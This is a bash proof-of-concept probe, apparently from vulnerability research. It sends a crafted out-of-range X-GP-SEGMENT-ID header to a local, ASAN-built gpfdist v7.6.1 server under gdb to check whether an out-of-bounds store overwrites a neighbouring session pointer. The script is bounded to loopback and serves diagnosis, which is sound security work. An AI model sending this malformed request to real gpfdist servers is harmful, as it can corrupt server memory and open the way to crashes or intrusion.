#!/usr/bin/env bash
# Bounded loopback probe: does a hostile segid reach the pointer-valued
# session->requests neighbour at the real gpfdist_v7.6.1.c:3677 store?
# One OPEN_SEQ request (no equality precondition); gdb reads the target
# bytes immediately before and after the store. Defaults are calibrated
# from the 11:59:35Z run: requests[0] == seq_segs + 8*28.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
PORT=${1:-18121}
SEGID=${2:-28}
OUT="$HERE/out_pointer_$PORT"; rm -rf "$OUT"; mkdir -p "$OUT/data"
printf 'row1\n' > "$OUT/data/out.txt"
: > "$OUT/server.log"
export ASAN_OPTIONS='detect_leaks=0:abort_on_error=0'
cd "$HERE"
gdb -q -batch -x gdb_pointer.gdb ./gpfdist_v7.6.1_asan >"$OUT/gdb.log" 2>&1 &
GPID=$!
for i in $(seq 1 80); do (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break; sleep 0.1; done
S="http://127.0.0.1:$PORT/out.txt"
CURL=$(curl -sS -m 5 -o "$OUT/body" -w '%{http_code}' -X POST "$S" \
  -H 'X-GP-PROTO:1' -H 'X-GP-XID:99' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
  -H 'X-GP-SEGMENT-COUNT:1' -H "X-GP-SEGMENT-ID:$SEGID" -H 'X-GP-SEQ:1' \
  2>"$OUT/curl.err")
echo "id=$SEGID seq=1 http=$CURL"
sleep 1
kill "$GPID" 2>/dev/null; wait "$GPID" 2>/dev/null
echo '--- gdb log ---'
cat "$OUT/gdb.log"
echo '--- server log (key lines) ---'
grep -E 'new session|joined session|free session|ERROR|Segmentation' "$OUT/server.log" | head -20
printf '\n--- asan files ---\n'; ls "$OUT"/asan* 2>/dev/null | head -5
